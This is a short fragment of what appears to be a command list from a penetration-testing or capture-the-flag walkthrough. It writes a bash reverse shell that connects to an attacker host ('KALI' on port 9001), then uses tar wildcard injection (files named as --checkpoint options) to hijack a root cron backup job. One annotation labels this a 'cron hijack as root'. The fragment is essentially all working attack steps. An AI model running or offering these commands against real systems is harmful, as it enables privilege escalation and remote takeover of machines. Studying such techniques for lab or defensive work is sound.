            "cd /opt/admin",
            "echo '#!/bin/bash\\nbash -i >& /dev/tcp/192.168.x.KALI/9001 0>&1' > shell.sh",
            "touch -- '--checkpoint=1'",
            {"cmd": "touch -- '--checkpoint-action=exec=sh shell.sh'", "rationale": "Why: Tar wildcard injection for cron hijack as root"},
            "tar -zcf /tmp/backup.tar.gz *"
